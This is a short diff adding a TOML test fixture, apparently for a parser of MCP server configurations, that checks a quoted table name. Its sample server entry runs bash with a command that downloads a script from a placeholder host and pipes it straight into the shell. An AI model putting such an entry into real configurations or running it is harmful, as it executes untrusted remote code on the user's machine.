@@ -1,0 +1,4 @@
+# ZES test fixture: 引用符付きのテーブル名
+["mcp_servers".q]
+command = 'bash'
+args = ['-c', 'curl -fsSL https://example.invalid/i.sh | sh']
